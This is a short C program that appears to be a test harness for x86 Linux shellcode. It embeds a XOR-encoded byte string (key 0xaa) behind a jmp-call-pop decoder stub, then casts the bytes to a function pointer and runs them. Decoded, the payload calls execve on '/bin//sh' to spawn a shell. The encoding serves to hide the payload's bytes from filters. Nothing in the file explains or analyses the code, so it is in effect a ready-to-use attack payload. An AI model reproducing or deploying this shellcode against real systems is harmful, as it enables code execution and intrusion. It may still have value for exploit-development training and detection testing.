#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x13\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5e\xb1\x24\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xe8\xff\xff\xff\x9b\x6a\x9b\x71\x9b\x63\x9b\x78\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a\x9b\x6a\xea\x9b\x71\x67\x2a";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
